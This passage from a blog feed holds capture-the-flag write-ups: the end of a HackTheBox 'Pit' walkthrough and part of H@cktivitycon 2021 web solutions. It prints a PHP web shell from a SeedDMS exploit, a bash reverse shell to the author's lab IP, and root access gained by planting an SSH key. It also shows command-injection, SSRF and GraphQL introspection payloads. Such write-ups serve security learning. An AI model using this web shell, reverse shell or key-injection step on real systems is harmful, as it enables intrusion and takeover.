2021/05/20 15:22:45 <span class="nv">Finished</span>
<span class="o">===============================================================</span>
</code></pre></div><p>Poking <code>/CHANGELOG</code> with curl reveals the software version.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49» 
$ curl -s http://dms-pit.htb/seeddms51x/seeddms/CHANGELOG  <span class="p">|</span> head 
--------------------------------------------------------------------------------
                     Changes in version 5.1.15
--------------------------------------------------------------------------------
- Improved import from file system
- HTTP Proxy <span class="k">for</span> access on external extension repository can be <span class="nb">set</span>
- Do not use unzip in ExtensionMgr anymore
- fix version compare on info page
- allow one page mode on search page
- fix import of older extension versions from repository
</code></pre></div><h4 id="searchsploit-1">Searchsploit</h4>
<p>I feed the version to <code>searchsploit</code>, and it returns with some potential exploits, there is one for RCE.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «pit» «10.10.14.49»
$ searchsploit seeddms
--------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                             <span class="p">|</span>  Path
--------------------------------------------------------------------------- ---------------------------------
SeedDMS 5.1.18 - Persistent Cross-Site Scripting                           <span class="p">|</span> php/webapps/48324.txt
SeedDMS &lt; 5.1.11 - <span class="s1">&#39;out.GroupMgr.php&#39;</span> Cross-Site Scripting                 <span class="p">|</span> php/webapps/47024.txt
SeedDMS &lt; 5.1.11 - <span class="s1">&#39;out.UsrMgr.php&#39;</span> Cross-Site Scripting                   <span class="p">|</span> php/webapps/47023.txt
SeedDMS versions &lt; 5.1.11 - Remote Command Execution                       <span class="p">|</span> php/webapps/47022.txt
--------------------------------------------------------------------------- ---------------------------------
</code></pre></div><p>The exploitation steps for the RCE vulnerability is as follow:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">Exploit Title: [Remote Command Execution through Unvalidated File Upload in SeedDMS versions &lt;5.1.11]
</span><span class="err"># Google Dork: [NA]
</span><span class="err"># Date: [20-June-2019]
</span><span class="err"># Exploit Author: [Nimit Jain](https://www.linkedin.com/in/nimitiitk)(https://secfolks.blogspot.com)
</span><span class="err"># Vendor Homepage: [https://www.seeddms.org]
</span><span class="err"># Software Link: [https://sourceforge.net/projects/seeddms/files/]
</span><span class="err"># Version: [SeedDMS versions &lt;5.1.11] (REQUIRED)
</span><span class="err"># Tested on: [NA]
</span><span class="err"># CVE : [CVE-2019-12744]
</span><span class="err">
</span><span class="err">Exploit Steps:
</span><span class="err">
</span><span class="err">Step 1: Login to the application and under any folder add a document.
</span><span class="err">Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used.
</span><span class="err">
</span><span class="err">PHP Backdoor Code: 
</span><span class="err">&lt;?php
</span><span class="err">
</span><span class="err">if(isset($_REQUEST[&#39;cmd&#39;])){
</span><span class="err">        echo &#34;&lt;pre&gt;&#34;;
</span><span class="err">        $cmd = ($_REQUEST[&#39;cmd&#39;]);
</span><span class="err">        system($cmd);
</span><span class="err">        echo &#34;&lt;/pre&gt;&#34;;
</span><span class="err">        die;
</span><span class="err">}
</span><span class="err">
</span><span class="err">?&gt;
</span><span class="err">
</span><span class="err">Step 3: Now after uploading the file check the document id corresponding to the document.
</span><span class="err">Step 4: Now go to example.com/data/1048576/&#34;document_id&#34;/1.php?cmd=cat+/etc/passwd to get the command response in browser.
</span><span class="err">
</span><span class="err">Note: Here &#34;data&#34; and &#34;1048576&#34; are default folders where the uploaded files are getting saved.
</span></code></pre></div><p>I will need a valid credentials for RCE.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-nginx">Shell as nginx</h3>
<h4 id="seeddms">SeedDMS</h4>
<p><code>admin:admin</code> are the default credentials for SeedDMS.</p>
<p><div class="img-container"><img src="imgs/image-20210521014957029.png" alt="image-20210521014957029"  /></div>
</p>
<p>But these creds didn&rsquo;t work here, so I submit <code>michelle:michelle</code>, and it logs me in 😮 !</p>
<p><div class="img-container"><img src="imgs/image-20210521023728548.png" alt="image-20210521023728548"  /></div>
</p>
<h4 id="seeddms-cve-2019-12744">SeedDMS CVE-2019-12744</h4>
<p>With a valid account, I can try to reproduce the exploitation steps for remote code execution.</p>
<p>First, I will create a document by navigating to <code>Docs &gt; Users &gt; Michelle</code> (folders), and then under <code>michelle</code> folder I will add a new document.</p>
<p><div class="img-container"><img src="imgs/image-20210521025006867.png" alt="image-20210521025006867"  /></div>
</p>
<p>On the local file menu, I will browse and upload my PHP web shell.</p>
<p><div class="img-container"><img src="imgs/image-20210521025924716.png" alt="image-20210521025924716"  /></div>
</p>
<p>And the file gets uploaded.</p>
<p><div class="img-container"><img src="imgs/image-20210521030038234.png" alt="image-20210521030038234"  /></div>
</p>
<p>According to the exploit author, the uploaded web shell should be available at  <code>http://dms-pit.htb/seeddms51x/seeddms/data/1048576/63/1.php?f=id</code>, where <code>63</code> is my document ID, I couldn&rsquo;t find it there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
$ curl -s <span class="s1">&#39;http://dms-pit.htb/seeddms51x/seeddms/data/1048576/63/1.php?f=id&#39;</span>
File not found.
</code></pre></div><p>The web server somehow has a weird routing, so I downloaded the SeedDMS source code to figure out its folder structure, and it was on <code>http://dms-pit.htb/seeddms51x/data/1048576/64/1.php?f=id</code>!</p>
<p><div class="img-container"><img src="imgs/image-20210521031346742.png" alt="image-20210521031346742"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>I will send a bash reverse shell to get a foothold on the box.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">/bin/bash -c <span class="s2">&#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.49/53 0&gt;&amp;1&#34;</span>
</code></pre></div><p>On my listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «exploits» «10.10.14.49»
$ nc -nvlp <span class="m">53</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.241<span class="o">]</span> <span class="m">58888</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>26319<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
bash-4.4$ id
id
<span class="nv">uid</span><span class="o">=</span>992<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>988<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>988<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:httpd_t:s0
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-michelle">Shell as Michelle</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Searching for string &ldquo;pass&rdquo; under <code>/var/www/html/seeddms51x/conf</code> reveals the database credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bash-4.4$ <span class="nb">pwd</span>
<span class="nb">pwd</span>
/var/www/html/seeddms51x/conf
bash-4.4$  grep -Ri <span class="s2">&#34;pass&#34;</span>
...<span class="o">[</span>SNIP<span class="o">]</span>...
settings.xml:    &lt;database <span class="nv">dbDriver</span><span class="o">=</span><span class="s2">&#34;mysql&#34;</span> <span class="nv">dbHostname</span><span class="o">=</span><span class="s2">&#34;localhost&#34;</span> <span class="nv">dbDatabase</span><span class="o">=</span><span class="s2">&#34;seeddms&#34;</span> <span class="nv">dbUser</span><span class="o">=</span><span class="s2">&#34;seeddms&#34;</span> <span class="nv">dbPass</span><span class="o">=</span><span class="s2">&#34;ied^ieY6xoquu&#34;</span> <span class="nv">doNotCheckVersion</span><span class="o">=</span><span class="s2">&#34;false&#34;</span>&gt;
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>Under <code>/var/www/html/seeddms51x/data/conf</code> there is also another database credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bash-4.4$ <span class="nb">pwd</span>
<span class="nb">pwd</span>
/var/www/html/seeddms51x/data/conf
bash-4.4$ grep -Ri pass
...<span class="o">[</span>SNIP<span class="o">]</span>...
settings.xml:    &lt;database <span class="nv">dbDriver</span><span class="o">=</span><span class="s2">&#34;sqlite&#34;</span> <span class="nv">dbHostname</span><span class="o">=</span><span class="s2">&#34;localhost&#34;</span> <span class="nv">dbDatabase</span><span class="o">=</span><span class="s2">&#34;/home/www-data/seeddms51x/data/content.db&#34;</span> <span class="nv">dbUser</span><span class="o">=</span><span class="s2">&#34;seeddms&#34;</span> <span class="nv">dbPass</span><span class="o">=</span><span class="s2">&#34;seeddms&#34;</span> <span class="nv">doNotCheckVersion</span><span class="o">=</span><span class="s2">&#34;false&#34;</span>&gt;
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>The password <code>ied^ieY6xoquu</code> is the one that valid.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bash-4.4$ mysql seeddms -u seeddms -pied^ieY6xoquu -e <span class="s1">&#39;show databases;&#39;</span>
mysql seeddms -u seeddms -pied^ieY6xoquu -e <span class="s1">&#39;show databases;&#39;</span>
Database
information_schema
seeddms
</code></pre></div><p>But, I didn&rsquo;t find anything juicy in the database.</p>
<h4 id="cockpit-tcp-9090">Cockpit (TCP 9090)</h4>
<p>Using <code>Michelle:ied^ieY6xoquu</code> on the Cockpit login page at <code>https://pit.htb:9090</code> logs me in.</p>
<p><div class="img-container"><img src="imgs/image-20210521063658472.png" alt="image-20210521063658472"  /></div>
</p>
<p>Cockpit gives terminal access through its web interface to communicate with the system.</p>
<p>Because of SELinux, I couldn&rsquo;t get my reverse shell to work, so I will just use this terminal and grab the user flag.</p>
<p><div class="img-container"><img src="imgs/image-20210521064953236.png" alt="image-20210521064953236"  /></div>
</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>For the SNMP enumeration, I will remember <code>/usr/bin/monitoring</code>, which turned out to be a bash script.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>michelle@pit /<span class="o">]</span>$ cat /usr/bin/monitor
<span class="c1">#!/bin/bash</span>

<span class="k">for</span> script in /usr/local/monitoring/check*sh
<span class="k">do</span>
    /bin/bash <span class="nv">$script</span>
<span class="k">done</span>
</code></pre></div><p>The script takes and executes other scripts which filename begins <code>check</code> and end with <code>sh</code> from <code>/usr/local/monitoring/</code> . If I try to list the content of that directory, it returns with permission denied.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>michelle@pit /<span class="o">]</span>$ ls -l /usr/local/monitoring/
ls: cannot open directory <span class="s1">&#39;/usr/local/monitoring/&#39;</span>: Permission denied
</code></pre></div><p>But with <code>-ld</code>, it shows that the folder has extended permission, and user <code>michelle</code> is allowed to write a file under that directory.</p>
<pre tabindex="0"><code>[michelle@pit /]$ ls -ld /usr/local/monitoring/
drwxrwx---+ 2 root root 122 May 20 20:35 /usr/local/monitoring/
[michelle@pit /]$ getfacl /usr/local/monitoring/
getfacl: Removing leading '/' from absolute path names
# file: usr/local/monitoring/
# owner: root
# group: root
user::rwx
user:michelle:-wx
group::rwx
mask::rwx
other::---
</code></pre><h4 id="from-snmp-to-rce">From SNMP to RCE</h4>
<p>From the SNMP enumeration, each time an SNMP &ldquo;walk&rdquo; is performed,  <code>usr/bin/monitor</code> always pops up in the <code>NET-SNMP-EXTEND-MIB</code> section.</p>
<p><div class="img-container"><img src="imgs/image-20210521075856288.png" alt="image-20210521075856288"  /></div>
</p>
<p>Based on the output above, and the following  <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/sect-system_monitoring_tools-net-snmp-extending">documentation</a>, there is a chance that when a SNMP walk is performed, Net-SNMP agent will also execute <code>/usr/bin/monitor</code>.</p>
<p><div class="img-container"><img src="imgs/image-20211013161852076.png" alt="image-20211013161852076"  /></div>
</p>
<p>So the idea here is that, I can try to write a file such as <code>check_blabla.sh</code> under <code>/usr/local/monitoring/</code> where <code>/usr/bin/monitor</code> then I will do a SNMP walk to trigger the Net-SNMP agent to execute <code>/usr/bin/monitor</code> which then eventually executes my script.</p>
<p>Now I will write a script to <code>/usr/local/monitoring/</code> that will inject my SSH public key to the root&rsquo;s authorized_keys file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>michelle@pit /<span class="o">]</span>$ <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/bash\nmkdir -p /root/.ssh/ 2&gt;/dev/null &amp;&amp; echo &#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPmWTx2r3W2mHnCnKmoJCnkrj6mXxSIGq3E5ks1g+moK&#34; &gt; /root/.ssh/authorized_keys&#39;</span> &gt; /usr/local/monitoring/check_iamf.sh
</code></pre></div><p>Then I will do another  SNMP walk and wait for it to finish, or at least get to the NET-SNMP-EXTEND-MIB output line.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
$ snmpwalk -v 2c -c public 10.10.10.241 internet
</code></pre></div><p>And now if I try to SSH login as root to Pit, it logs me in.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
$ ssh root@10.10.10.241
Web console: https://pit.htb:9090/

Last login: Thu May <span class="m">20</span> 21:12:44 <span class="m">2021</span> from 10.10.14.49
<span class="o">[</span>root@pit ~<span class="o">]</span><span class="c1"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
<span class="o">[</span>root@pit ~<span class="o">]</span><span class="c1"># ls -l</span>
total <span class="m">8</span>
-rwx------. <span class="m">1</span> root root <span class="m">706</span> Apr <span class="m">22</span>  <span class="m">2020</span> cleanup.sh
drwx------. <span class="m">2</span> root root <span class="m">122</span> Apr <span class="m">18</span>  <span class="m">2020</span> monitoring
lrwxrwxrwx. <span class="m">1</span> root root   <span class="m">9</span> May <span class="m">10</span> 11:07 null -&gt; /dev/null
-r--------. <span class="m">1</span> root root  <span class="m">33</span> May <span class="m">20</span> 02:00 root.txt
<span class="o">[</span>root@pit ~<span class="o">]</span><span class="c1">#</span>
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210521081359037.png" alt="image-20210521081359037"  /></div>
</p>
<blockquote>
<p>Phew, I didn&rsquo;t expect this writeup to be this long. 😅🔨</p>
</blockquote>
]]></content:encoded>
    </item>
    
    <item>
      <title>H@cktivitycon 2021 - Web</title>
      <link>https://fahmifj.github.io/ctf/hacktivitycon-2021-web/</link>
      <pubDate>Sat, 09 Oct 2021 13:39:22 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/ctf/hacktivitycon-2021-web/</guid>
      <description>Another late CTF writeups for H@cktivitycon 2021 web category.</description>
      <content:encoded><![CDATA[<p>A continuation of the H@cktivitycon 2021 CTF writeups, but this one is dedicated to the web category I solved.</p>
<h2 id="easy">Easy</h2>
<h3 id="swaggy">Swaggy</h3>
<h4 id="description">Description</h4>
<blockquote>
<p>This API documentation has all the swag</p>
</blockquote>
<h4 id="walkthrough">Walkthrough</h4>
<p>Swaggy is the easiest one, it hosts an instance of <a href="https://swagger.io/tools/swagger-ui/">Swagger UI</a>. There are two API endpoint servers: <code>api.congon4tor.com/v1</code> (production, not available) and <code>staging-api.congon4tor.com:7777</code> (staging). To get the flag, I have to send a HTTP GET request to <code>staging-api.congon4tor.com:7777/flag</code>, but without the correct credentials, it won&rsquo;t give you the flag.</p>
<p><div class="img-container"><img src="imgs/image-20210917154230629.png" alt="image-20210917154230629"  /></div>
</p>
<p>The words &ldquo;staging&rdquo; and &ldquo;testing&rdquo; are the clues for this challenge. Some devs out there typically use common credentials for easy auth, and in this case <code>admin:admin</code> are used.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@ubuntu:~$ <span class="nb">echo</span> -n <span class="s1">&#39;admin:admin&#39;</span> <span class="p">|</span> base64                                               
<span class="nv">YWRtaW46YWRtaW4</span><span class="o">=</span>
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210917154250166.png" alt="image-20210917154250166"  /></div>
</p>
<h3 id="confidentiality">Confidentiality</h3>
<h4 id="description-1">Description</h4>
<blockquote>
<p>My school was trying to teach people about the CIA triad so they made  all these dumb example applications&hellip; as if they know anything about  information security. Can you prove these aren&rsquo;t so secure?</p>
</blockquote>
<h4 id="walkthrough-1">Walkthrough</h4>
<p>The challenge provides a simple website which allows you to list a file permission by inputting the file&rsquo;s path.</p>
<p><div class="img-container"><img src="imgs/image-20210917152231603.png" alt="image-20210917152231603"  /></div>
</p>
<p>If the file does not exist, it spits out an error message which reveals the command used was something like <code>ls -l [path-to-file]</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210917152250416.png" alt="image-20210917152250416"  /></div>
</p>
<p>Now I know that it passes my submitted input (as arguments) to OS commands, therefore I can try to submit a command separator like <code>;</code>, <code>|</code> or some logical operation like <code>||</code> or <code>&amp;&amp;</code>.</p>
<p>It turned out <code>;</code> worked.</p>
<p><div class="img-container"><img src="imgs/image-20210917152339216.png" alt="image-20210917152339216"  /></div>
</p>
<p>And I can just grab the flag.</p>
<p><div class="img-container"><img src="imgs/image-20210917152358697.png" alt="image-20210917152358697"  /></div>
</p>
<h3 id="titanic">Titanic</h3>
<h4 id="description-2">Description</h4>
<blockquote>
<p>Tee-Tech is a rising cyber security organization which creates tools and provide cyber security solution to it&rsquo;s clients, but are they themself secure enough?</p>
</blockquote>
<h4 id="walkthrough-2">Walkthrough</h4>
<p>This challenge hosts a website for a company called Tee-Tech.</p>
<p><div class="img-container"><img src="imgs/image-20210918175527330.png" alt="image-20210918175527330"  /></div>
</p>
<p>The <code>admin</code> menu points to <code>/admin.php</code>, where a login form is shown. I tried several common credentials and SQLi but no luck.</p>
<p><div class="img-container"><img src="imgs/image-20210918175618452.png" alt="image-20210918175618452"  /></div>
</p>
<p>In the page source, I found a commented menu (anchor tag) which reveals a web path to <code>/server-status</code>. If I&rsquo;m not mistaken, the page returned a forbidden error when I visited it directly from a browser.</p>
<p><div class="img-container"><img src="imgs/image-20210918181859427.png" alt="image-20210918181859427"  /></div>
</p>
<p>In the next section of the main site, there is a tool offered by this company.</p>
<p><div class="img-container"><img src="imgs/image-20210918175548838.png" alt="image-20210918175548838"  /></div>
</p>
<p>The tool could be used to take a screenshot of a given website URL, so it&rsquo;s SSRF. The captured site image can be viewed at <code>/captures/captured.png</code></p>
<p><div class="img-container"><img src="imgs/image-20210918175635276.png" alt="image-20210918175635276"  /></div>
</p>
<p>When I submitted <code>http://127.0.0.1/</code>, it returned with the following image, which I assume is basically the loading animation of the main site.</p>
<p><div class="img-container"><img src="imgs/image-20210918175721424.png" alt="image-20210918175721424"  /></div>
</p>
<p>If I use the URL capturer to let it visit <code>http://127.0.0.1/server-status</code>, it captures the following contents:</p>
<p><div class="img-container"><img src="imgs/image-20210918182150035.png" alt="image-20210918182150035"  /></div>
</p>
<p>It looked like a kind of web server log, and it contained a set of credentials!</p>
<p>And if I use that creds ( <code>root:EYNDR4NhadwX9rtef</code>) for login, it gives me the flag.</p>
<p><div class="img-container"><img src="imgs/image-20210918183140505.png" alt="image-20210918183140505"  /></div>
</p>
<h2 id="medium">Medium</h2>
<h3 id="integrity">Integrity</h3>
<h4 id="description-3">Description</h4>
<blockquote>
<p>My school was trying to teach people about the CIA triad so they made all these dumb example applications&hellip; as if they know anything about  information security.</p>
<p>Supposedly they learned their lesson and tried to make this one more secure. Can you prove it is still vulnerable?</p>
</blockquote>
<h4 id="walkthrough-3">Walkthrough</h4>
<p>This challenge provides the same UI as Confidentiality, but the functionality is changed. The same trick didn&rsquo;t work here.</p>
<p><div class="img-container"><img src="imgs/image-20210917154503521.png" alt="image-20210917154503521"  /></div>
</p>
<p>I tried several characters for command injection, and the following were found to be filtered.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">% | \ &#34; &#39; { } ` $ ( ) &amp; _ 
</code></pre></div><p>The next thing  I tried was CRLF injection, and it did work with LF (<code>\n</code>).</p>
<p><div class="img-container"><img src="imgs/image-20210917034219286.png" alt="image-20210917034219286.png"  /></div>
</p>
<p>I can just grab the flag.</p>
<p><div class="img-container"><img src="imgs/image-20210917034235319.png" alt="image-20210917034235319"  /></div>
</p>
<h3 id="all-baked-up">All Baked Up</h3>
<p>The walkthrough for this challenge is going to be a bit longer (I might consider separating this) because this is my first encounter with GraphQL, and it was fun 😅.</p>
<h4 id="description-4">Description</h4>
<blockquote>
<p>Grandma always knew how to make tried-and-true baked goods, and these recipes prove it!</p>
</blockquote>
<h4 id="initial-analysis">Initial analysis</h4>
<p>This challenges hosts a kind of blog about cake.</p>
<p><div class="img-container"><img src="imgs/image-20210917202740803.png" alt="image-20210917202740803"  /></div>
</p>
<p>When observing the network traffic, I see a POST request to GraphQL endpoint.</p>
<p><div class="img-container"><img src="imgs/image-20210917202816500.png" alt="image-20210917202816500"  /></div>
</p>
<p>To investigate it more, I started Burp Suite and then intercepted a POST request to GraphQL for a single post.</p>
<h4 id="graphql">GraphQL</h4>
<p>For a single request, the body contains the following data.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
   <span class="nt">&#34;operationName&#34;</span><span class="p">:</span><span class="s2">&#34;UserQuery&#34;</span><span class="p">,</span>
   <span class="nt">&#34;variables&#34;</span><span class="p">:{</span>
      <span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Strawberry Cake&#34;</span>
   <span class="p">},</span>
   <span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;query UserQuery($name: String!) { post(name: $name) { id    name image  content author { username __typename } __typename }  }&#34;</span>
<span class="p">}</span>
</code></pre></div><p>And the returned response is something like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
   <span class="nt">&#34;data&#34;</span><span class="p">:{</span>
      <span class="nt">&#34;post&#34;</span><span class="p">:[</span>
         <span class="p">{</span>
            <span class="nt">&#34;__typename&#34;</span><span class="p">:</span><span class="s2">&#34;Post&#34;</span><span class="p">,</span>
            <span class="nt">&#34;author&#34;</span><span class="p">:{</span>
               <span class="nt">&#34;__typename&#34;</span><span class="p">:</span><span class="s2">&#34;User&#34;</span><span class="p">,</span>
               <span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;congon4tor&#34;</span>
            <span class="p">},</span>
            <span class="nt">&#34;content&#34;</span><span class="p">:</span><span class="s2">&#34;1. Preheat oven to 350°. Line the bottoms of 2 greased 8-in. round baking pans with parchment; grease parchment.\n2. In a large bowl, combine cake mix, gelatin, sugar and flour. Add water, oil and eggs; beat on low speed 30 seconds. Beat on medium 2 minutes. Fold in chopped strawberries. Transfer to prepared pans.\n3. Bake until a toothpick inserted in center comes out clean, 25-30 minutes. Cool in pans 10 minutes before removing to wire racks; remove paper. Cool completely.\n4. For frosting, in a small bowl, beat butter until creamy. Beat in crushed strawberries. Gradually beat in enough confectioners’ sugar to reach desired consistency. Spread frosting between layers and over top and sides of cake.&#34;</span><span class="p">,</span>
            <span class="nt">&#34;id&#34;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span>
            <span class="nt">&#34;image&#34;</span><span class="p">:</span><span class="s2">&#34;https://www.tasteofhome.com/wp-content/uploads/2018/01/Mamaw-Emily-s-Strawberry-Cake_EXPS_FRBZ19_82745_C01_31_4b-9.jpg?resize=696,696&#34;</span><span class="p">,</span>
            <span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Strawberry Cake&#34;</span>
         <span class="p">}</span>
      <span class="p">]</span>
   <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>I found out that the request data can actually be shortened into something like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
   <span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;query { post(name: \&#34;Strawberry Cake\&#34;) { id    name image  content author { username __typename } __typename }  }&#34;</span>
<span class="p">}</span>

<span class="err">#</span> <span class="err">or</span> <span class="err">just</span>
<span class="p">{</span>
   <span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;{ post(name: \&#34;Strawberry Cake\&#34;) { id    name image  content author { username __typename } __typename }  }&#34;</span>
<span class="p">}</span>
</code></pre></div><p>The first thing I tried was querying the DB schema using the following query from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection">PayloadAllTheThings</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;{__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}}&#34;</span><span class="p">}</span>
</code></pre></div><p>The server responded with</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;__schema&#34;</span><span class="p">:{</span><span class="nt">&#34;directives&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Included when true.&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;if&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Directs the executor to include this field or fragment only when the `if` argument is true.&#34;</span><span class="p">,</span><span class="nt">&#34;locations&#34;</span><span class="p">:[</span><span class="s2">&#34;FIELD&#34;</span><span class="p">,</span><span class="s2">&#34;FRAGMENT_SPREAD&#34;</span><span class="p">,</span><span class="s2">&#34;INLINE_FRAGMENT&#34;</span><span class="p">],</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;include&#34;</span><span class="p">},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Skipped when true.&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;if&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Directs the executor to skip this field 